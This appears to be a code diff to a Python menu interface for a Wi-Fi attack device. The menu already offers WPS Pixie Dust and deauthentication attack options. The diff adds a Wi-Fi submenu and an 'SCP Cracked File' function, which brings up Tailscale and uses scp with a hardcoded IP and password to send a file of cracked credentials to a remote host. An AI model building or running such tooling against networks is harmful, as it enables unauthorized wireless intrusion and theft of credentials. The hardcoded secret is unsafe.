@@ -11,6 +11,8 @@ import threading
 from essid_utils import ESSIDS, excluded_essid, selected_essid, selected_bssid
 from command_utils import build_and_run_command
 from setting import state
+import json
+from wifi_menu import wifi_menu
 
 current_index = 0
 
@@ -144,7 +146,9 @@ def landing_menu():
         {"name": f"{selected_interface}", "action": toggle_interface},  # Change None to toggle_interface
         {"name": "Refresh Interfaces", "action": refresh_interfaces},
         {"name": "PIXIE QUICK 30", "action": lambda: build_and_run_command(option_name="PIXIE QUICK 30")},
-        {"name": "DEAUTH QUICK 120", "action": lambda: build_and_run_command(option_name="DEAUTH QUICK 120")}
+        {"name": "DEAUTH QUICK 120", "action": lambda: build_and_run_command(option_name="DEAUTH QUICK 120")},
+        {"name": "SCP Cracked File", "action": scp_cracked_file},
+        {"name": "Wi-Fi", "action": wifi_menu}  # New option for Wi-Fi submenu
     ]
     active_idx = 0
     total_options = len(options)
@@ -381,7 +385,7 @@ def scan_wifi_networks():
     selected_interface_name = selected_interface[0] if isinstance(selected_interface, tuple) else selected_interface
     display_message_with_wrap(f"{selected_interface_name}")
 
-    max_attempts = 1  # Maximum number of scan attempts
+    max_attempts = 2  # Maximum number of scan attempts
     scan_attempts = 0
     check_monitor_mode_and_disable(selected_interface_name)
 
@@ -499,3 +503,44 @@ def refresh_interfaces():
     
     display_message("Interfaces refreshed")
     draw_menu(current_index)  # Redraw the menu to reflect the changes
+
+import pexpect
+from datetime import datetime
+
+def scp_cracked_file():
+    try:
+        # Start Tailscale
+        subprocess.run(["sudo", "tailscale", "up"], check=True)
+        display_message_with_wrap("Tailscale started successfully!")
+
+        # Define the destination Tailscale IP, path, and password
+        tailscale_ip = "100.108.95.32"  # Replace with your Tailscale IP
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        destination_path = f"/home/sun/crack/{timestamp}.json"
+        password = "1120"  # Replace with the actual password
+
+        # SCP command
+        command = f"scp /home/sun/cracked.json sun@{tailscale_ip}:{destination_path}"
+
+        # Use pexpect to handle the password prompt
+        child = pexpect.spawn(command)
+        child.expect("password:")  # Wait for the password prompt
+        child.sendline(password)  # Send the password
+        child.expect(pexpect.EOF)  # Wait for the command to complete
+
+        display_message_with_wrap("File transferred successfully!")
+        time.sleep(1.5)
+
+    except pexpect.exceptions.EOF as e:
+        display_message_with_wrap(f"SCP failed: {e}")
+    except subprocess.CalledProcessError as e:
+        display_message_with_wrap(f"Error: {e}")
+    except Exception as e:
+        display_message_with_wrap(f"Unexpected error: {e}")
+    finally:
+        # Stop Tailscale
+        try:
+            subprocess.run(["sudo", "tailscale", "down"], check=True)
+            display_message_with_wrap("Tailscale stopped successfully!")
+        except subprocess.CalledProcessError as e:
+            display_message_with_wrap(f"Error stopping Tailscale: {e}")
